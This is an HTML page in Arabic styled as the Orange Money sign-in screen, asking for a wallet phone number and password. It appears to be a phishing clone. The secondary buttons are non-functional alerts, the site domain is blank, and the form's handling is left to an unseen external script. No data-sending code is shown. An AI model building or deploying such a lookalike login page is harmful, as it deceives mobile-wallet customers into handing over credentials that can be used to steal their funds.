<!DOCTYPE html>
<html data-wf-domain="" data-wf-page="58e125466699330e60585c64" data-wf-site="64ef7d0d34ee51e7fdfd939c" lang="ar" dir="rtl">
<head>
  <meta charset="utf-8"/>
  <title>Orange Money - الصفحة الرئيسية</title>
  <meta content="width=device-width, initial-scale=1" name="viewport"/>
  <link href="https://cdn.prod.website-files.com/6709b4ecad0f1ceeeed96305/css/orangemonney.webflow.4d36521a0.css" rel="stylesheet" type="text/css"/>
  <link href="https://fonts.googleapis.com" rel="preconnect"/>
  <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin="anonymous"/>
  <script src="https://ajax.googleapis.com/ajax/libs/webfont/1.6.26/webfont.js" type="text/javascript"></script>
  <script type="text/javascript">
    WebFont.load({google:{families:["Montserrat:100,100italic,200,200italic,300,300italic,400,400italic,500,500italic,600,600italic,700,700italic,800,800italic,900,900italic","Roboto:300,regular,500"]}});
  </script>
  <link href="https://cdn.prod.website-files.com/img/favicon.ico" rel="shortcut icon" type="image/x-icon"/>
  <link href="https://cdn.prod.website-files.com/img/webclip.png" rel="apple-touch-icon"/>
  <style>
    body { box-sizing: border-box; font-size:18px; background-color: #faf7f4; font-family: 'Montserrat', 'Roboto', Arial, Tahoma, sans-serif;}
    .container { padding: 0 5%;}
    .field-holder { position: relative; margin-bottom:1.25em;}
    .w-input { border:0; border-bottom: 3px solid #dfdfdf; outline:none; font-size:1em; width:100%; height:55px; background: none; color: #333; padding: 0 10px 0 0; box-sizing: border-box;}
    label { position:absolute; top:0; left:0; font-size:1em; color:#424242; display:flex; align-items:center; cursor:text; transition: .3s ease-in-out; width: 100%; height: 55px; pointer-events: none;}
    .w-input:focus + label, .w-input:valid + label { color:#ff7900; font-size:.75em; top:-25px; pointer-events: none;}
    .w-input:focus,  .w-input:valid { border-bottom: 3px solid #ff7900;}
    .submit-button { width: 100%; background: #ff7900; color: #fff; border: none; padding: 14px; border-radius: 6px; font-size: 18px; margin-top: 22px; cursor: pointer; font-family: inherit; transition: background 0.2s;}
    .submit-button:hover { background: #e86c00;}
    .div-block.spacea { display: flex; flex-direction: column; gap: 10px; margin-top: 16px;}
    .button-black { background: #242424; color: #fff;}
    .not-black { background: #fff; color: #ff7900; border: 2px solid #ff7900;}
    .w-form-done, .w-form-fail { margin-top: 20px; font-size: 1em; text-align: center; border-radius: 6px; padding: 12px 10px; display: none;}
    .w-form-done { background: #e7faea; color: #069d36;}
    .w-form-fail { background: #fff0f0; color: #c00;}
    .CustomFooter { position: fixed; left: 0; bottom: 0; width: 100%; background: #faf7f4; color: #999; text-align: center; font-size: 15px; padding: 10px 0; z-index: 100;}
    @media (max-width: 600px) { .container { padding: 0 2%; } .div-block-2 { padding-top: 15px;} .div-block-4 { padding-top: 0; } }
  </style>
</head>
<body class="body">
  <div class="div-block-2">
    <div class="header-section">
      <div class="w-container" style="text-align:center;">
        <a href="/" aria-current="page" class="blog-home-link w-inline-block w--current">
          <img src="https://cdn.prod.website-files.com/6709b4ecad0f1ceeeed96305/6709b4ecad0f1ceeeed963e7_OM%20logo_0.svg"
            loading="lazy" width="106" height="Auto" alt="Orange Money Logo" class="image"/>
        </a>
      </div>
    </div>
  </div>
  <div class="div-block-4">
    <div class="container">
      <div class="w-form">
        <form id="signin" autocomplete="off">
          <div class="field-holder">
            <input class="text-field-2 w-input" minlength="10" maxlength="10" name="phonenumber"
              inputmode="numeric" pattern="^(079|078|077)[0-9]{7}$" placeholder="" type="text" id="phonenumber" required/>
            <label for="phonenumber" class="field-label">رقم المحفظة</label>
          </div>
          <div class="field-holder">
            <input class="text-field-2 w-input" maxlength="256" name="password"
              placeholder="" type="password" id="password" minlength="3" required/>
            <label for="password" class="field-label-2">كلمة السر</label>
          </div>
          <div class="div-block">
            <input type="submit" data-wait="يرجى الانتظار" class="submit-button w-button" value="تسجيل دخول"/>
          </div>
          <div class="div-block spacea">
            <input type="button" class="submit-button button-black w-button" value="التسجيل الذاتي" onclick="alert('الميزة غير مفعلة حالياً');"/>
            <input type="button" class="submit-button button-black not-black w-button" value="تسجيل دخول لأول مرة" onclick="alert('الميزة غير مفعلة حالياً');"/>
          </div>
        </form>
        <div class="w-form-done" id="form-done"></div>
        <div class="w-form-fail" id="form-fail"></div>
      </div>
    </div>
  </div>
  <div class="CustomFooter">Orange Money &copy; 2025</div>
  <script src="main.js"></script>
</body>
</html>
